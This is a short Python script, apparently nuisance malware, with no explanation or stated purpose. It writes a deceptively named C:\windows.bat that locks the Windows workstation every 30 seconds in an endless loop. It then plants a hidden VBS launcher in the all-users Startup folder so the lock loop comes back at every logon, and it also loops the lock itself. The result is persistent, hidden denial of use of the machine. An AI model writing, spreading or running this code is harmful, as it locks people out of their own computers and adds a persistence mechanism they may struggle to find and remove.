#Delta
import time 
import os

myBat = open(r'C:\windows.bat','w+')
myBat.write('''
@echo off
:start
Rundll32.exe user32.dll,LockWorkStation
timeout /t 30
goto start
''')
myBat.close() 

myBat = open(r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\start_bat.vbs','w+')
myBat.write('''
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\windows.bat" & Chr(34), 0
Set WshShell = Nothing
''')
myBat.close() 

while True:
  time.sleep(30)
  os.system("Rundll32.exe user32.dll,LockWorkStation")